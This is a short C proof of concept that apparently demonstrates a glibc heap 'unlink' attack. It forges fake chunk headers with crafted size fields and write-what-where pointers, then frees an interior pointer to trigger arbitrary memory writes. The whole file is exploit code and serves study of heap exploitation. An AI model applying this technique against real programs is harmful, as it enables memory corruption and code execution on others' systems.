#include <stdio.h>
#include <stdlib.h>


#define WHAT_2_WRITE  0x7ffffffde120
#define WHERE_2_WRITE 0x7ffffffde120
#define SZ            13
#define SOMEOFFSET    5 + (rand() % (SZ-1))
#define PREV_INUSE    1
#define IS_MMAP       2
#define NON_MAIN_ARENA 4
int main() {
	unsigned long *unlinkMe;
	int i = 0;
	
	unsigned long sz = 13;

	unlinkMe = (unsigned long*)malloc(sz * sizeof(unsigned long));

	// 1st nasty chunk
	unlinkMe[i++] = -4;
	unlinkMe[i++] = -4;
	unlinkMe[i++] = -4;
	unlinkMe[i++] = WHAT_2_WRITE;
	unlinkMe[i++] = WHERE_2_WRITE - 16;

	// 2st nasty chunk
	unlinkMe[i++] = -4;
	unlinkMe[i++] = -32;
	unlinkMe[i++] = 17;
	unlinkMe[i++] = WHAT_2_WRITE;
	unlinkMe[i++] = WHERE_2_WRITE - 16;

	for(;i < sz; i++)
		if(i%2)
			unlinkMe[i] = ((-(i-7) * 8) & ~(IS_MMAP|NON_MAIN_ARENA)) | PREV_INUSE;
		else
			unlinkMe[i] = ((-(i-2) * 8) & ~(IS_MMAP|NON_MAIN_ARENA)) | PREV_INUSE;
	
	free(unlinkMe + SOMEOFFSET);
	return 0;	
}
